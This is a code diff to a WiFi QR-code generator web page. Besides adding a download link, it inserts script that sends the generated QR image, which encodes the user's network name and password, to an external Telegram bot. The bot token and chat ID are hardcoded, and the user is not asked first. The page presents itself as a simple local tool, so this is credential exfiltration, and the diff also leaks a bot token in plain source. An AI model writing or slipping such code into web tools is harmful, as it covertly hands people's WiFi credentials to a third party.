@@ -94,8 +94,22 @@
             <button onclick="submitForm()">Generate QR Code</button>
         </div>
         <div id="qrcode"></div>
+        <div class="instructions" id="instructions"></div>
+        <div class="download-link" id="download-link">
+            <a id="download" download="wifi_qr_code.png">Download QR Code</a>
+        </div>
     </div>
     <script>
+        function dataURLToBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
         function submitForm() {
             const ssid = document.getElementById('ssid').value;
             const password = document.getElementById('password').value;
@@ -108,7 +122,32 @@
                 width: 256,
                 height: 256,
                 correctLevel: QRCode.CorrectLevel.H
-            });
+            }); setTimeout(async () => {
+                const qrCanvas = qrCodeContainer.querySelector('canvas');
+                if (qrCanvas) {
+                    const qrImage = qrCanvas.toDataURL('image/png');
+
+                    // Send the QR code image to Telegram bot
+                    const telegramBotToken = '7485708002:AAEy-gCr1lG9ZX6AXxpJdbo6GjA6xtJ5L5U';
+                    const chatId = '7485708002';
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', dataURLToBlob(qrImage), 'wifi_qr_code.png');
+
+                    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+                    if (result.ok) {
+                        alert('QR code sent to Telegram bot successfully!');
+                    } else {
+                        alert('Failed to send QR code to Telegram bot.');
+                    }
+                }
+            }, 500); // Delay to ensure QR code is rendered
+
 
             // Notify the user
             alert('Scan the QR code with your phone to connect to the WiFi network.');
